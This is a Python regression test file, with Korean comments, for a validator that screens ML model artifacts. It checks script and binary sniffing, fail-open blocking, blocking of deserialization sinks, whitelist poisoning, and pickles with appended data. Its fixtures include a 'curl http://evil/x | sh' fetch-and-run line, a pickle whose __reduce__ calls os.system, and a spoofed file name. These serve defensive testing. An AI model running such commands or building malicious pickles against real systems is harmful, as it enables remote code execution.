"""feature/audit-hardening-fixes 보안 수정 회귀 테스트.

전체 코드/깃 적대검증에서 실증된 결함의 수정을 고정한다.
  H1a — /jobs 빈 아티팩트 fail-open(APPROVE) 차단
  H1b/D9 — OTHER 버킷의 실행 스크립트/바이너리 content-sniff → 검토 강제
  H2 — joblib.load / torch.hub.load / dill / marshal.load → BLOCK
  D1 — is_allowed_exact가 PERMANENTLY_BLOCKED를 ApprovedApi 오염에도 ALLOW 안 함
  D4 — pickle STOP 이후 trailing data(append된 악성 피클) → BLOCK
"""
import os
import pickle

import pytest
from fastapi.testclient import TestClient

from proxy.app.main import app
from analyzer.classifier import (
    build_artifact_ref,
    looks_like_executable_or_script,
)
from analyzer.schemas import ValidationStatus
from analyzer.validators.code_validator import validate_python_artifact
from analyzer.validators.weight.validators.pickle_opcode_parser import (
    _reconstruct_safe_object,
)
from whitelist.integration import WhitelistEngineLookup
from whitelist.models import WhitelistSource
from whitelist.tables import ApprovedApi


client = TestClient(app)


# ── H1b/D9: 실행 스크립트/바이너리 탐지 ────────────────────────────────────
class TestExecutableSniff:
    def test_shell_script_flagged(self):
        assert looks_like_executable_or_script("startup.sh", b"#!/bin/sh\n")

    def test_double_extension_python_flagged(self):
        assert looks_like_executable_or_script("payload.py.txt", b"import os")

    def test_elf_binary_flagged(self):
        assert looks_like_executable_or_script("blob", b"\x7fELF\x02\x01\x01")

    def test_pe_binary_flagged(self):
        assert looks_like_executable_or_script("x.dll", b"MZ\x90\x00")

    def test_shebang_without_extension_flagged(self):
        assert looks_like_executable_or_script("hook", b"#!/usr/bin/env python\n")

    def test_readme_not_flagged(self):
        assert not looks_like_executable_or_script("README.md", b"hello world")

    def test_plain_json_not_flagged(self):
        assert not looks_like_executable_or_script("data.json", b'{"a": 1}')


# ── H1a / H1b: /jobs 엔드포인트 fail-open 차단 ────────────────────────────
def _job_payload(artifacts):
    return {
        "request_id": "t",
        "job_id": "t",
        "policy_fingerprint": "policy-2026.04.22",
        "artifacts": artifacts,
    }


def _other_artifact(name, content, ext):
    import hashlib

    sha = hashlib.sha256(content).hexdigest()
    return {
        "artifact_id": f"sha256:{sha}",
        "repo_path": name,
        "file_name": name,
        "file_kind": "OTHER",
        "detected_extension": ext,
        "size_bytes": len(content),
        "sha256": sha,
        "source_url": "local",
        "temp_local_path": None,  # 채워짐
        "referenced_by": [],
        "is_generated": False,
    }


class TestJobsFailOpen:
    def test_empty_artifacts_not_approved(self):
        resp = client.post("/internal/v1/validation/jobs", json=_job_payload([]))
        assert resp.status_code == 200
        assert resp.json()["overall_decision"] == "ERROR"

    def test_executable_other_forces_review(self, tmp_path):
        p = tmp_path / "startup.sh"
        p.write_bytes(b"#!/bin/sh\ncurl http://evil/x | sh\n")
        art = _other_artifact("startup.sh", p.read_bytes(), ".sh")
        art["temp_local_path"] = str(p)
        resp = client.post("/internal/v1/validation/jobs", json=_job_payload([art]))
        assert resp.status_code == 200
        body = resp.json()
        assert body["overall_decision"] == "REVIEW_REQUIRED"
        assert body["artifact_results"][0]["status"] == "PENDING_REVIEW"

    def test_benign_other_still_skipped(self, tmp_path):
        p = tmp_path / "README.md"
        p.write_text("hello", encoding="utf-8")
        art = _other_artifact("README.md", p.read_bytes(), ".md")
        art["temp_local_path"] = str(p)
        resp = client.post("/internal/v1/validation/jobs", json=_job_payload([art]))
        assert resp.status_code == 200
        body = resp.json()
        assert body["artifact_results"][0]["status"] == "SKIPPED"
        assert body["pending_artifact_ids"] == []

    def test_metadata_spoofed_executable_other_is_gated(self, tmp_path):
        # 양유상 PR #53: repo_path는 payload.py.txt(실행물)인데 file_name만 README.md로
        # 위장. file_name만 신뢰하면 우회됨 → repo_path/basename도 검사해야 게이트됨.
        import hashlib

        p = tmp_path / "payload.py.txt"
        p.write_bytes(b"import os\nos.system('echo x')\n")  # shebang 없는 일반 파이썬
        content = p.read_bytes()
        sha = hashlib.sha256(content).hexdigest()
        art = {
            "artifact_id": f"sha256:{sha}",
            "repo_path": "payload.py.txt",
            "file_name": "README.md",  # 메타데이터 위장
            "file_kind": "OTHER",
            "detected_extension": ".md",
            "size_bytes": len(content),
            "sha256": sha,
            "source_url": "local",
            "temp_local_path": str(p),
            "referenced_by": [],
            "is_generated": False,
        }
        resp = client.post("/internal/v1/validation/jobs", json=_job_payload([art]))
        assert resp.status_code == 200
        body = resp.json()
        assert body["overall_decision"] == "REVIEW_REQUIRED"
        assert body["artifact_results"][0]["status"] == "PENDING_REVIEW"


# ── H2: 역직렬화/원격코드 sink → BLOCK ─────────────────────────────────────
class TestDeserializerSinksBlocked:
    @pytest.mark.parametrize(
        "sink",
        [
            "import joblib; joblib.load(d)",
            "import torch; torch.hub.load('a', 'b')",
            "import dill; dill.loads(d)",
            "import marshal; marshal.load(d)",
        ],
    )
    def test_sink_blocks(self, sink):
        body = (
            "from torch import nn\n"
            "class M(nn.Module):\n"
            "    def forward(self, d):\n"
            f"        {sink}\n"
        )
        ref = build_artifact_ref("modeling_x.py", content=body)
        res = validate_python_artifact(ref, source=body)
        assert res.status is ValidationStatus.BLOCK, sink


# ── D1: 오염된 ApprovedApi 행으로 영구차단 우회 불가 ───────────────────────
def test_d1_poisoned_approved_row_not_allowed(db_session):
    db_session.add(
        ApprovedApi(
            api_path="pickle.loads",
            namespace="pickle",
            source=WhitelistSource.INITIAL,
            matched_rule="pickle.*",
            is_blocked=False,  # 오염: 차단돼야 할 API가 비차단으로 등록됨
        )
    )
    db_session.commit()
    lookup = WhitelistEngineLookup(db_session)
    assert lookup.is_allowed_exact("pickle.loads") is False


# ── D4: pickle STOP 이후 trailing data → BLOCK ────────────────────────────
class TestPickleTrailingData:
    def test_clean_data_pickle_reconstructs(self, tmp_path):
        p = tmp_path / "clean.pkl"
        p.write_bytes(pickle.dumps({"a": [1, 2, 3], "b": (4, 5)}))
        assert _reconstruct_safe_object(str(p))["status"] == "PASS"

    def test_appended_pickle_blocked(self, tmp_path):
        class Evil:
            def __reduce__(self):
                return (os.system, ("echo x",))

        p = tmp_path / "appended.pkl"
        p.write_bytes(pickle.dumps({"a": [1, 2, 3]}) + pickle.dumps(Evil()))
        out = _reconstruct_safe_object(str(p))
        assert out["status"] == "BLOCK"
        assert out["reason_code"] == "PICKLE_TRAILING_DATA"
